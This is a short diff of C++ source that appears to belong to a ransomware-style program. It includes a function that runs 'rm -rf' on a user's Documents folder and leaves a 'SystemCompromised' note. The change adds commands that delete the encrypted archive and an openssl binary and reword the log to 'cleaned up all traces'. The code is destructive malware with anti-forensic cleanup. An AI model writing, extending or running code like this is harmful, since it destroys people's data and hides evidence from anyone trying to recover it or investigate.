@@ -352,8 +352,10 @@ void tarAndEncrypt(){
 1. Delete the /home/ubuntu/Documents folder
 2. Leave system Compromised message on the /home/ubuntu folder*/
 void deleteDirAndLeaveMessage() {
+    system("rm /home/ubuntu/DocumentsDir.tar.gz");
+    system("rm /home/ubuntu/openssl");
     system("rm -rf /home/ubuntu/Documents/");
-    printf("\n Deleted Documents folder");
+    printf("\n Deleted Documents folder and cleaned up all traces");
     std::ofstream myfile("/home/ubuntu/SystemCompromisedCpp.txt");
  
     if (myfile.is_open())
